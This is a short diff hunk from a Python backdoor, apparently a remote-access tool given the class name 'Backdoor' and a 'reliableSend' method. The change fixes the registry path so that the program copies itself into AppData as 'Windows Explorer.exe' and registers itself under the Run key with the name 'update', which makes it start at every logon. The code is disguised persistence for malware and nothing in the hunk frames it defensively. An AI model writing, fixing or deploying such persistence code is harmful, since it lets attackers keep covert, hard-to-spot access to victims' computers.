@@ -17,7 +17,7 @@ class Backdoor:
         fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
         if not os.path.exists(fileLocation):
             shutil.copyfile(sys.executable, fileLocation)
-            subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
+            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
     
     #Codificación json:
     def reliableSend(self, data):
